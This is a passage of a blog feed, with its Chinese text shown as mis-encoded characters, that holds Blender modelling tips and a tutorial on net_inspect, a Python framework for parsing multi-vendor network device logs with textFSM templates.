</strong></p><p>å¤åˆ¶å¤šä¸ªå¯¹åƒï¼Œç„¶å<code>Ctrl + L</code> å…³è”èœå•, <strong>å…³è”ç‰©ä½“æ•°æ®</strong>,å¯ä»¥æŠŠå¤šä¸ªå¯¹åƒå…³è”èµ·æ¥ï¼Œä¸€èµ·ä¿®æ”¹ã€‚</p><p>å¦‚æœç‰©ä½“æ˜¯æ–œçš„ï¼Œå¸Œæœ›æ”¾åˆ°æ°´å¹³çš„åŸç‚¹è¿›è¡Œä¿®æ”¹ï¼Œå¯ä»¥<code>Alt+D</code>å…³è”å¤åˆ¶å‡ºæ¥ï¼Œç„¶å<code>Alt+R</code>å–æ¶ˆæ—‹è½¬ï¼Œ<code>Alt+G</code>å–æ¶ˆç§»åŠ¨ï¼Œè¿™è¿™ä¸ªå¤åˆ¶ä½“ä¸Šä¿®æ”¹ï¼Œå®Œæˆååˆ é™¤å³å¯ã€‚</p><p>è¿˜æœ‰ä¸€ç§å¤åˆ¶çš„æ–¹æ³•ï¼Œå°±æ˜¯ä½œä¸ºé›†åˆï¼Œåˆ›å»ºé›†åˆå®ä¾‹ã€‚</p><p>æƒ³è¦éšæœºå˜åŒ–ï¼Œé€‰ä¸­éœ€è¦çš„ï¼Œ<strong>ç‰©ä½“-&gt;å˜æ¢-&gt;éšæœºå˜æ¢</strong></p><p>æƒ³è¦å°†ä¸€ä¸ªç‰©ä½“çš„ä½ç½®ï¼Œæ—‹è½¬ä¿¡æ¯å¤åˆ¶åˆ°å¦å¤–çš„ç‰©ä½“ï¼šé€‰ä¸­éœ€è¦çš„ï¼Œ<strong>N(æ¡ç›®)-&gt; å¯¹éœ€è¦çš„æ•°å€¼å³é”® -&gt; å…¨éƒ¨å¤åˆ¶åˆ°é€‰ä¸­é¡¹</strong> (è§†é¢‘P2 14:20)</p><p>å¤šé€‰æ—¶ï¼ŒæŒ‰ä½<code>Alt</code>å†ä¿®æ”¹å±æ€§å€¼ï¼Œå¯ä»¥åŒæ—¶ä¿®æ”¹å¤šé€‰çš„å¯¹åƒã€‚</p><p>æ·»åŠ è¾¹åˆ°é¡¶ç‚¹ç»„<code>Ctrl+G</code>é‡Œé¢ï¼Œç„¶åæ·»åŠ å¤šä¸ªå€’è§’ä¿®æ”¹å™¨ï¼Œä½¿ç”¨é¡¶ç‚¹ç»„è¿›è¡Œç²¾ç»†ä¿®æ”¹</p><p>å¦‚ä½•è®©å€’è§’æŠ˜ç—•æ›´åŠ æ¼‚äº®ï¼ˆè§†é¢‘P2 25:00ï¼‰</p><p>é•œåƒä¿®æ”¹å™¨ï¼Œå¦‚æœå·²ç»å¥½äº†çš„ä¸œè¥¿éœ€è¦é•œåƒä¿®æ”¹ï¼Œä½¿ç”¨é•œåƒä¿®æ”¹å™¨åï¼ŒæŠŠ<strong>åˆ‡åˆ†</strong>ä¹ŸåŒæ ·è½´å‹¾é€‰ä¸Šã€‚</p><p>åœ¨ç‰©ä½“æ¨¡å¼ä¸‹ï¼Œé€‰æ‹©å³ä¸Šè§’é€‰é¡¹ï¼Œå¯ä»¥ä¿®æ”¹åŸç‚¹ï¼Œç­‰ä¿¡æ¯ã€‚</p><p><strong>æ•°ç»„ä¿®æ”¹å™¨</strong>ï¼ˆè§†é¢‘P2 32:15)</p><p>å¯ä»¥é€šè¿‡<strong>æ•°ç»„+ç®€æ˜“å˜å½¢</strong>Zè½´æ¥è¾¾åˆ°ç”»ä¸ªåœ†çš„æ•ˆæœï¼Œå¹¶è¿›è¡Œå¿«é€Ÿä¿®æ”¹ã€‚æœ€åç”¨ç„Šæ¥å™¨æŠŠè¿æ¥å¤„åˆå¹¶æ‰ã€‚</p><p>é€šè¿‡<strong>æ•°ç»„ï¼ˆç‰©ä½“åç§»ï¼‰+ç©ºç‰©ä½“ï¼ˆçº¯è½´ï¼‰</strong>æ¥å®ç°ç¯ç»•æ•ˆæœ</p><p><strong>æ•°ç»„ï¼ˆé€‚é…æ›²çº¿ï¼‰+æ›²çº¿</strong>ï¼Œå¯ä»¥æ²¿ç€æ›²çº¿è‡ªåŠ¨é€‚é…ã€‚ï¼ˆè§†é¢‘P2 43ï¼š00ï¼‰</p><p>åˆ›å»ºçƒä½“æœ€å¥½é€šè¿‡ç«‹æ–¹ä½“æ¥åˆ›å»ºï¼Œä½¿ç”¨<strong>è¡¨é¢ç»†åˆ† + é“¸å‹</strong>å®ç°ï¼Œæˆ–è€…ç®€å•çš„æ—¶å€™extraæ’ä»¶çš„åœ†å½¢ç«‹æ–¹ä½“ï¼Œé€‰æ‹©<code>Quadsphere</code>é¢„è®¾å³å¯ã€‚</p><p>åˆ›å»ºå¯¹ç§°çš„ç®¡å­ï¼š çº¿æ®µï¼Œ<strong>é•œåƒ+è¡¨é¢ç»†åˆ†+è’™çš®+è¡¨é¢ç»†åˆ†</strong></p><p>ä½¿ç”¨<code>å¤šçº§ç²¾åº¦</code>ä¿®æ”¹å™¨ï¼Œå¢åŠ ç»†åˆ†åï¼Œå†è¿›è¡Œé›•åˆ»ï¼Œå¯ä»¥éšæ—¶å–æ¶ˆã€‚</p><p>å°†ä¸¤ä¸ªç‰©ä½“åŠ¨æ€é“¾æ¥èµ·æ¥ï¼ˆè§†é¢‘P2 49ï¼š15ï¼‰ï¼Œæ–¹æ³•æ˜¯é€‰ä¸­éœ€è¦è¿æ¥ç‰©ä½“çš„å¾ªç¯åº•é¢ç‚¹ï¼Œåˆ›å»ºç¼©è£¹ä¿®æ”¹å™¨ï¼Œæ”¹ä¸ºæŠ•å½±ã€Zè½´ã€‚å¹¶é€‰æ‹©ç›®æ ‡å’Œé¡¶ç‚¹ç»„ã€‚</p><p>å¿«é€Ÿåˆ›å»ºçº¿ç¼†çš„æ–¹æ³•ï¼ˆè§†é¢‘P2 59ï¼š16ï¼‰ï¼Œåˆ›å»ºä¸€ä¸ªæ›²çº¿ï¼Œä¿®æ”¹æ›²çº¿çš„å‡ ä½•æ•°æ®ï¼Œå€’è§’æ·±åº¦åŠ å¤§ã€‚ç„¶ååˆ‡æ¢åˆ°ç¼–è¾‘æ¨¡å¼ï¼Œç”¨è‡ªç”±çº¿å·¥å…·ç›´æ¥ç”»ã€‚ æƒ³è¦é™„ç€è¡¨é¢ï¼Œåœ¨æ´»åŠ¨å·¥å…·è®¾ç½®ä¸­çš„æ·±åº¦ï¼Œè®¾ç½®ä¸º<em>è¡¨é¢</em>ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘ç»œè®¾å¤‡æ•°æ®è§£æè‡ªåŠ¨åŒ–æ¡†æ¶net_inspectä½¿ç”¨æ•™ç¨‹</title>
      <link href="/2022/09/05/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%95%B0%E6%8D%AE%E8%A7%A3%E6%9E%90%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A1%86%E6%9E%B6net-inspect%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/2022/09/05/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%95%B0%E6%8D%AE%E8%A7%A3%E6%9E%90%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A1%86%E6%9E%B6net-inspect%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä½œä¸ºç½‘ç»œå·¥ç¨‹å¸ˆï¼Œéœ€è¦ç»å¸¸æ”¶é›†è®¾å¤‡çš„è®¾å¤‡ä¿¡æ¯ï¼Œæ¯”å¦‚è®¾å¤‡CPUåˆ©ç”¨ç‡ã€å†…å­˜åˆ©ç”¨ç‡ã€è½¯ä»¶ç‰ˆæœ¬ã€åºåˆ—å·ã€æ¥å£çŠ¶æ€ç­‰ï¼Œè¿™äº›ä¿¡æ¯å¯ä»¥ç”¨æ¥ç›‘æ§ç½‘ç»œè®¾å¤‡çš„è¿è¡ŒçŠ¶æ€ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥åšè®¾å¤‡çš„èµ„äº§ç®¡ç†ã€‚</p><p>åœ¨å·²ç»æ”¶é›†å®Œæˆçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦å°†å…³é”®ä¿¡æ¯æå–å‡ºæ¥ï¼Œç„¶åå°†å¯ç”¨æ•°æ®æŒ‰éœ€æ±‚æ ¼å¼è¾“å‡ºã€‚å¸‚é¢ä¸Šç›®å‰æ²¡æœ‰é’ˆå¯¹å¤šå‚å•†çš„ç½‘ç»œè®¾å¤‡æ•°æ®è§£æå·¥å…·ï¼Œå‚å®¶åªä¼šåˆ¶ä½œé’ˆå¯¹è‡ªå·±è®¾å¤‡çš„è§£æå·¥å…·ã€‚é€ æˆä½¿ç”¨å‰²è£‚ï¼Œå¹¶ä¸”è¾“å‡ºæ ·å¼ä¹Ÿæ— æ³•åšåˆ°è‡ªå®šä¹‰ã€‚</p><p>å¦å¤–ï¼Œç½‘ç»œå·¥ç¨‹å¸ˆå­¦ä¹ ç¼–ç¨‹åå¤§éƒ¨åˆ†éƒ½æ˜¯å•å…µä½œæˆ˜ï¼Œé’ˆå¯¹è‡ªå·±çš„ä½¿ç”¨åœºæ™¯ï¼Œè¿›è¡Œä¸“æœ¬çš„è„šæœ¬ç¼–å†™ï¼Œè¿™å°±å¯¼è‡´äº†è„šæœ¬çš„å¯å¤ç”¨æ€§å¾ˆå·®ï¼Œå¦‚æœéœ€è¦åœ¨å…¶ä»–åœºæ™¯ä¸‹ä½¿ç”¨ï¼Œå°±éœ€è¦é‡æ–°ç¼–å†™è„šæœ¬ï¼Œè¿™æ ·ä¼šé€ æˆå¾ˆå¤§çš„å·¥ä½œé‡ã€‚</p><p>ä¹‹å‰é€šå¸¸æƒ…å†µä¸‹ï¼Œéƒ½ä¼šé€šè¿‡<code>vty</code> æˆ–è€… <code>console</code> è¿æ¥åˆ°è®¾å¤‡ä¸Šï¼Œç„¶åé€šè¿‡<code>show</code>æˆ–è€…<code>display</code>å‘½ä»¤è·å–è®¾å¤‡çš„çŠ¶æ€ä¿¡æ¯ï¼Œç„¶åé€šè¿‡<code>textFSM</code>æˆ–è€…æ­£åˆ™è¡¨è¾¾å¼è§£ææ•°æ®ï¼Œæœ€åå°†å¯ç”¨å¾—æ•°æ®æŒ‰éœ€æ±‚æ ¼å¼è¿›è¡Œè¾“å‡ºã€‚</p><p>ä½†æ˜¯ï¼Œè¿™æ ·çš„æ“ä½œæ–¹å¼æœ‰å¾ˆå¤šä¸ä¾¿ï¼Œæ¯”å¦‚ï¼š</p><ol><li>åœ¨é€šè¿‡<code>show</code>æˆ–è€…<code>display</code>å°†ä¿¡æ¯æ”¶é›†åï¼Œå¦‚ä½•åˆ†å‰²å‘½ä»¤çš„å›æ˜¾ï¼Ÿå“ªäº›æ˜¯æ— æ•ˆå‘½ä»¤ï¼Ÿ</li><li>ç½‘ç®¡å¹³å°æ”¶é›†çš„ä¿¡æ¯æ ¼å¼ä¸ä¸€æ ·æ€ä¹ˆå¤„ç†ï¼Ÿ</li><li>å¦‚ä½•è¯†åˆ«è®¾å¤‡å¯¹åº”çš„å‚å•†ï¼Ÿ</li><li>å¦‚ä½•è°ƒç”¨å¯¹åº”çš„<code>textFSM</code>æ¨¡æ¿ï¼Ÿ</li><li>å¦‚ä½•æœç´¢å‘½ä»¤è·å–å…³é”®ä¿¡æ¯ï¼Ÿ</li><li>å¤šå‚å•†çš„æƒ…å†µä¸‹ï¼Œå¦‚ä½•åšåˆ°ç»Ÿä¸€çš„æ•°æ®è°ƒç”¨ï¼Ÿ</li><li>å¤šå‚å•†çš„æƒ…å†µä¸‹ï¼Œå¦‚ä½•åšåˆ°ç»Ÿä¸€çš„æ•°æ®æ ¼å¼ï¼Ÿ</li><li><code>ntc-templates</code>å¤§éƒ¨åˆ†æ¨¡æ¿éƒ½æ˜¯å›½å¤–å‚å•†ï¼Œæ€ä¹ˆåŠï¼Ÿ</li><li>å¦‚ä½•åœ¨è°ƒç”¨<code>ntc-templates</code>çš„åŒæ—¶ï¼Œå¦‚ä½•è°ƒç”¨è‡ªå·±å†™çš„<code>textFSM</code>æ¨¡æ¿åº“ï¼Ÿ</li><li>è®¾è®¡çš„è„šæœ¬åªé’ˆå¯¹å•ä¸€æƒ…å†µï¼Œå¦‚ä½•è§£å†³å¤ç”¨æ€§çš„é—®é¢˜ï¼Ÿ</li></ol><p>è¦è§£å†³ä»¥ä¸Šé—®é¢˜ï¼Œå°±éœ€è¦ç”¨åˆ°<code>net_inspect</code>è¿™ä¸ªæ¡†æ¶ï¼Œå®ƒå¯ä»¥å¸®åŠ©æˆ‘ä»¬è§£å†³ä»¥ä¸Šé—®é¢˜ã€‚</p><h2 id="net-inspectæ¡†æ¶ä»‹ç»"><a href="#net-inspectæ¡†æ¶ä»‹ç»" class="headerlink" title="net_inspectæ¡†æ¶ä»‹ç»"></a>net_inspectæ¡†æ¶ä»‹ç»</h2><p><a href="https://github.com/Elinpf/net_inspect">net_inspect</a>æ˜¯ä¸€ä¸ªåŸºäº<code>python</code>çš„ç½‘ç»œè®¾å¤‡æ•°æ®è§£æè‡ªåŠ¨åŒ–æ¡†æ¶</p><p>æ¡†æ¶è®¾è®¡çš„åˆè¡·å°±æ˜¯å°†å„ä¸ªç¯èŠ‚è§£è€¦ï¼Œä½¿å„ä¸ªç¯èŠ‚èƒ½å¤Ÿç‹¬ç«‹å¼€å‘æ‰©å±•ï¼Œæœ€ç»ˆå®ç°å¯¹å¤šå‚å•†è®¾å¤‡çš„æ•°æ®è§£æã€‚</p><p>å®‰è£…æ–¹æ³•ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">pip install net_inspect</span></code></pre></div></div><h3 id="ä¸€ä¸ªç®€å•çš„ä¾‹å­"><a href="#ä¸€ä¸ªç®€å•çš„ä¾‹å­" class="headerlink" title="ä¸€ä¸ªç®€å•çš„ä¾‹å­"></a>ä¸€ä¸ªç®€å•çš„ä¾‹å­</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-reasonml codeBlockLines"><span class="line">â”œâ”€â”€ log</span><span class="line">â”‚Â Â  â”œâ”€â”€ <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Switch_A</span>.</span></span>log</span><span class="line">â”‚Â Â  â”œâ”€â”€ <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Switch_B</span>.</span></span>log</span><span class="line">â”‚Â Â  â”œâ”€â”€ <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Switch_C</span>.</span></span>log</span></code></pre></div></div><p>å¯ç”¨çœ‹åˆ°ï¼Œåœ¨<code>log</code>æ–‡ä»¶å¤¹ä¸‹æœ‰ä¸‰å°è®¾å¤‡çš„å‘½ä»¤çš„å›æ˜¾ä¿¡æ¯ï¼Œè¿™äº›æ–‡ä»¶æ˜¯é€šè¿‡<code>vty</code>æˆ–è€…<code>console</code>è¿æ¥åˆ°è®¾å¤‡ä¸Šä½œä¸ºè®°å½•æ—¥å¿—ä¿å­˜ä¸‹æ¥ã€‚æ¯ä¸ªæ–‡ä»¶ä¸­éƒ½éœ€è¦åŒ…å«<code>display version</code> è¿™ä¸ªå‘½ä»¤æ¥è¯†åˆ«è®¾å¤‡çš„å‚å•†ã€‚</p><p>ç°åœ¨æˆ‘ä»¬éœ€è¦å°†è¿™äº›è®¾å¤‡çš„å‚å•†ã€è½¯ä»¶ç‰ˆæœ¬ã€ç®¡ç†IPï¼Œæå–æ‰“å°å‡ºæ¥ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> net_inspect <span class="hljs-keyword">import</span> NetInspect</span><span class="line"></br></span><span class="line">net = NetInspect()</span><span class="line">net.set_plugins(input_plugin=<span class="hljs-string">&#x27;console&#x27;</span>)</span><span class="line">net.run(path=<span class="hljs-string">&#x27;log&#x27;</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;total devices:&#x27;</span>, <span class="hljs-built_in">len</span>(net.cluster.devices))</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">for</span> device <span class="hljs-keyword">in</span> net.cluster.devices:</span><span class="line">    info = device.info</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; | &#x27;</span>.join([info.hostname, info.ip, info.vendor,</span><span class="line">          info.version, info.model, info.cpu_usage]))</span></code></pre></div></div><p>output:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">total devices: 3</span><span class="line">Switch_A | 24.44.1.248 | Huawei | 5.170 | S12704 Terabit Routing Switch | 6%</span><span class="line">Switch_B | 24.45.1.240 | H3C | 5.20 Release: 3342 | SR8800 | 5%</span><span class="line">Switch_C | 24.45.254.254 | H3C | 5.20 Release: 1238P08 | S9508E-V | 1%</span></code></pre></div></div><p>å¯ä»¥çœ‹åˆ°ï¼Œä»…ä»…é€šè¿‡ç®€å•çš„å‡ è¡Œä»£ç ï¼Œå°±å¯ä»¥å®ç°å¯¹å¤šå‚å•†è®¾å¤‡çš„æ•°æ®è§£æå’Œè°ƒç”¨ã€‚</p><blockquote><p><code>console</code>ä»£è¡¨çš„æ˜¯<code>vty</code>æˆ–è€…<code>console</code>è¿æ¥è®¾å¤‡çš„å›æ˜¾ä¿¡æ¯æ ¼å¼ã€‚</p></blockquote><blockquote><p>å¯ä¾›ä½¿ç”¨çš„base_infoå±æ€§ä¿¡æ¯åœ¨ä½¿ç”¨<code>net_inspect -b</code>æŸ¥çœ‹</p></blockquote><h3 id="æ¡†æ¶çš„ç»„æˆ"><a href="#æ¡†æ¶çš„ç»„æˆ" class="headerlink" title="æ¡†æ¶çš„ç»„æˆ"></a>æ¡†æ¶çš„ç»„æˆ</h3><p><code>net_inspect</code>ç”±ä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ç»„æˆï¼š</p><ul><li><code>input_plugin</code> è¾“å…¥æ’ä»¶ï¼Œç”¨äºå°†è®¾å¤‡çš„å›æ˜¾è¿›è¡Œåˆ†å‰²ï¼Œå°†æ¯ä¸ªæ‰§è¡Œçš„å‘½ä»¤å’Œå¯¹åº”çš„å›æ˜¾ä½œä¸ºå­—å…¸å‚¨å­˜ã€‚</li><li><code>parse_plugin</code> è§£ææ’ä»¶ï¼Œç”¨äºå¯¹å‘½ä»¤è¿›è¡Œè§£æï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä¸éœ€è¦è¿›è¡Œä¿®æ”¹ã€‚</li><li><code>analysis_plugin</code> åˆ†ææ’ä»¶ï¼Œæ¯ä¸€ä¸ªåˆ†ææ’ä»¶å¯¹åº”ä¸€ä¸ªçŠ¶æ€åˆ†æï¼Œæ¯”å¦‚<code>power_status</code>å°±æ˜¯ç”¨æ¥åˆ†æè®¾å¤‡çš„ç”µæºçŠ¶æ€çš„ã€‚</li><li><code>output_plugin</code> è¾“å‡ºæ’ä»¶ï¼Œç”¨äºè¾“å‡ºç»Ÿä¸€çš„æ ¼å¼æŠ¥å‘Šã€‚</li><li><code>base_info</code> åŸºç¡€ä¿¡æ¯ï¼Œç”¨äºå­˜æ”¾è®¾å¤‡çš„åŸºç¡€ä¿¡æ¯ï¼Œæ¯”å¦‚å‚å•†ã€è½¯ä»¶ç‰ˆæœ¬ã€ç®¡ç†IPç­‰ã€‚å¯ä»¥å…¨å‚å•†ç»Ÿä¸€è°ƒç”¨ã€‚</li></ul><blockquote><p>æœ‰æ—¶å€™æˆ‘ä»¬æ”¶é›†è®¾å¤‡ä¿¡æ¯çš„æ–¹å¼ä¸æ­¢æ˜¯é€šè¿‡consoleï¼Œæˆ–è€…è‡ªå·±çš„telnet/sshã€‚è€Œæ˜¯é€šè¿‡ç½‘ç®¡å¹³å°è¿›è¡Œçš„ï¼Œå›æ˜¾æ ¼å¼ä¸åŒï¼Œè¿™æ—¶å€™å°±éœ€è¦è‡ªå·±å†™ä¸€ä¸ª<code>input_plugin</code>ï¼Œå°†ç½‘ç®¡å¹³å°çš„æ•°æ®è½¬æ¢æˆ<code>net_inspect</code>éœ€è¦çš„æ ¼å¼ã€‚</p></blockquote><blockquote><p><code>parse_plugin</code> ä½¿ç”¨çš„æ˜¯<a href="https://github.com/Elinpf/ntc-templates">ntc_templates_elinpf</a>è¿™ä¸ªåº“ï¼Œå®ƒæ˜¯<code>ntc_templates</code>çš„ä¸€ä¸ªåˆ†æ”¯ï¼Œä¸»è¦æ˜¯ä¸ºäº†è§£å†³<code>ntc_templates</code>æ²¡æœ‰å¯¹å›½å†…å‚å•†æ”¯æŒçš„é—®é¢˜ã€‚</p></blockquote><blockquote><p>æ‰€ä»¥ï¼Œéœ€è¦å…ˆå¸è½½<code>pip uninstall ntc_templates</code> ç„¶åå®‰è£…<code>pip install ntc_templates_elinpf</code></p></blockquote><p><code>net_inspect</code>æ”¯æŒcliçš„å‘½ä»¤è¡Œæ¨¡å¼ï¼Œå¯ä»¥é€šè¿‡<code>net_inspect -h</code>æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯ã€‚</p><p><img src="/2022/09/05/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%95%B0%E6%8D%AE%E8%A7%A3%E6%9E%90%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A1%86%E6%9E%B6net-inspect%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2.png"></p><h2 id="è¿›é˜¶æ•™ç¨‹"><a href="#è¿›é˜¶æ•™ç¨‹" class="headerlink" title="è¿›é˜¶æ•™ç¨‹"></a>è¿›é˜¶æ•™ç¨‹</h2><p>ä¸Šé¢çš„ç®€å•ä¾‹å­ä¸­è¿˜æœ‰å¾ˆå¤šåœ°æ–¹æ²¡æœ‰æ¶‰åŠåˆ°ï¼Œæ¯”å¦‚<code>analysis_plugin</code>çš„ä½¿ç”¨ï¼Œ<code>base_info</code>çš„ä½¿ç”¨ï¼Œ<code>output_plugin</code>çš„ä½¿ç”¨ç­‰ç­‰ã€‚</p><p>è¯•æƒ³ä¸€ä¸ªæƒ…å†µï¼Œæˆ‘ä»¬éœ€è¦è·å–è®¾å¤‡çš„<code>show clock</code>ä¿¡æ¯ï¼Œåœ¨<code>ntc_templates_elinpf</code>ä¸­æ²¡æœ‰ï¼Œæ€ä¹ˆåŠï¼Ÿ</p><h3 id="è°ƒç”¨å¤–éƒ¨textFSMæ¨¡æ¿"><a href="#è°ƒç”¨å¤–éƒ¨textFSMæ¨¡æ¿" class="headerlink" title="è°ƒç”¨å¤–éƒ¨textFSMæ¨¡æ¿"></a>è°ƒç”¨å¤–éƒ¨textFSMæ¨¡æ¿</h3><p>è¦è§£å†³<code>ntc_templates_elinpf</code>ä¸­æ²¡æœ‰æ¨¡æ¿çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±å†™ä¸€ä¸ªæœ¬åœ°çš„textFSMæ¨¡æ¿ä»“åº“ï¼Œç„¶åè°ƒç”¨ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">â”œâ”€â”€ local_templates</span><span class="line">â”‚Â Â  â”œâ”€â”€ huawei_vrp_display_clock.textfsm</span><span class="line">â”‚Â Â  â”œâ”€â”€ hp_comware_display_clock.textfsm</span><span class="line">â”‚Â Â  â”œâ”€â”€ cisco_ios_show_clock.textfsm</span><span class="line">â”‚Â Â  â”œâ”€â”€ index</span></code></pre></div></div><p>å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„æœ¬åœ°æ¨¡æ¿åº“ä¸­ï¼ŒåŒ…å«äº†<code>huawei_vrp</code>ã€<code>hp_comware</code>ã€<code>cisco_ios</code>ä¸‰ä¸ªå‚å•†çš„<code>display clock</code>æ¨¡æ¿ã€‚</p><p>å¦å¤–è¿˜æœ‰ä¸€ä¸ª<code>index</code>æ–‡ä»¶ï¼Œç”¨äºæŒ‡å®šæ¨¡æ¿çš„è°ƒç”¨å‘½ä»¤ï¼Œæ¯•ç«Ÿæˆ‘ä»¬åœ¨æ•²å‘½ä»¤çš„æ—¶å€™ä¸ä¼šæ•²å…¨ï¼Œæ¯”å¦‚<code>display clock</code>ï¼Œæˆ‘ä»¬å¯ä»¥æ•²<code>dis clo</code>ï¼Œè¿™æ—¶å€™å°±éœ€è¦<code>index</code>æ–‡ä»¶æ¥æŒ‡å®šã€‚</p><p><code>index</code>æ–‡ä»¶å†…å®¹å¦‚ä¸‹:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">Template, Hostname, Platform, Command</span><span class="line"></br></span><span class="line">huawei_vrp_display_clock.textfsm, .*, huawei_vrp, dis[[play]] clo[[ck]]</span><span class="line"></br></span><span class="line">hp_comware_display_clock.textfsm, .*, hp_comware, di[[splay]] clo[[ck]]</span><span class="line"></br></span><span class="line">cisco_ios_show_clock.textfsm, .*, cisco_ios, sh[[ow]] clo[[ck]]</span></code></pre></div></div><p>æ³¨æ„æ¯ä¸ªå‚å•†éœ€è¦ç©ºæ ¼éš”å¼€, å¹¶ä¸”å¼€å¤´å¿…é¡»è¦æœ‰<code>Template, Hostname, Platform, Command</code>è¿™è¡Œã€‚</p><p>åšå¥½å‡†å¤‡å·¥ä½œåï¼Œåªéœ€è¦åœ¨è„šæœ¬ä¸­è°ƒç”¨æœ¬åœ°æ¨¡æ¿åº“å³å¯ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> net_inspect <span class="hljs-keyword">import</span> NetInspect, vendor</span><span class="line"></br></span><span class="line">net = NetInspect()</span><span class="line">net.set_plugins(input_plugin=<span class="hljs-string">&#x27;console&#x27;</span>)</span><span class="line">net.set_external_templates(<span class="hljs-string">&#x27;local_templates&#x27;</span>)  <span class="hljs-comment"># è°ƒç”¨æœ¬åœ°æ¨¡æ¿åº“</span></span><span class="line">net.run(path=<span class="hljs-string">&#x27;log&#x27;</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;total devices:&#x27;</span>, <span class="hljs-built_in">len</span>(net.cluster.devices))</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">for</span> device <span class="hljs-keyword">in</span> net.cluster.devices:</span><span class="line">    info = device.info</span><span class="line">    clock = <span class="hljs-string">&#x27;&#x27;</span></span><span class="line">    <span class="hljs-keyword">if</span> device.vendor == vendor.Huawei:</span><span class="line">        <span class="hljs-keyword">with</span> device.search_cmd(<span class="hljs-string">&#x27;display clock&#x27;</span>) <span class="hljs-keyword">as</span> cmd:</span><span class="line">            <span class="hljs-keyword">if</span> cmd.parse_result:</span><span class="line">                ps = cmd.parse_result[<span class="hljs-number">0</span>]</span><span class="line">                clock = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ps[<span class="hljs-string">&#x27;year&#x27;</span>]&#125;</span>-<span class="hljs-subst">&#123;ps[<span class="hljs-string">&#x27;month&#x27;</span>]&#125;</span>-<span class="hljs-subst">&#123;ps[<span class="hljs-string">&#x27;day&#x27;</span>]&#125;</span> <span class="hljs-subst">&#123;ps[<span class="hljs-string">&#x27;time&#x27;</span>]&#125;</span>&quot;</span></span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">if</span> device.vendor == vendor.H3C:</span><span class="line">        <span class="hljs-keyword">with</span> device.search_cmd(<span class="hljs-string">&#x27;display clock&#x27;</span>) <span class="hljs-keyword">as</span> cmd:</span><span class="line">            <span class="hljs-keyword">if</span> cmd.parse_result:</span><span class="line">                ps = cmd.parse_result[<span class="hljs-number">0</span>]</span><span class="line">                clock = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ps[<span class="hljs-string">&#x27;year&#x27;</span>]&#125;</span>-<span class="hljs-subst">&#123;ps[<span class="hljs-string">&#x27;month&#x27;</span>]&#125;</span>-<span class="hljs-subst">&#123;ps[<span class="hljs-string">&#x27;day&#x27;</span>]&#125;</span> <span class="hljs-subst">&#123;ps[<span class="hljs-string">&#x27;time&#x27;</span>]&#125;</span>&quot;</span></span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; | &#x27;</span>.join([info.hostname, clock]))</span></code></pre></div></div><p>output:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">total devices: 3</span><span class="line">Switch_A | 2021-03-19 10:23:08</span><span class="line">Switch_B | 2021-03-19 10:24:17</span><span class="line">Switch_C | 2021-03-19 10:32:17</span></code></pre></div></div><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬é€šè¿‡è°ƒç”¨æœ¬åœ°æ¨¡æ¿åº“ï¼ŒæˆåŠŸè§£æäº†<code>display clock</code>å‘½ä»¤ã€‚</p><p>ç„¶åæœç´¢å‚å•†å¯¹åº”çš„å‘½ä»¤ï¼Œå°†è§£æçš„ç»“æœæ ¼å¼åŒ–ä¸ºæˆ‘ä»¬æƒ³è¦çš„æ ¼å¼ã€‚æœ€åå†è¾“å‡ºã€‚</p><p>è¿™æ 